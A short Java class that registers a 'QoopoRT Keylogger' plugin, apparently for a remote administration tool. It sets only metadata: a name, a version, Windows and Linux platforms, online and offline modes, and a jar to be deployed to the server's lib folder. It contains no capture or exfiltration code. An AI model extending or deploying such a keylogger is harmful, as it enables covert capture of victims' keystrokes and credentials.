/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools && Templates
 * and open the template in the editor.
 */
package plugin.p1;

import java.util.ArrayList;
import plugin.Plugin;

/**
 *
 * @author alberto
 */
public class PluginDef extends Plugin {

    public PluginDef() {
        setId("1");
        setNombre("QoopoRT Keylogger");
        setVersion("1.1");
        setDescripcion("Keylogger de QoopoRT. soporta modo online y offline");
        setPlataformas("Windows, Linux");
        setListaArchivo(new ArrayList<String>());
        getListaArchivo().add("QoopoRTPlugKL.jar&&<server>/lib");        
    }
}
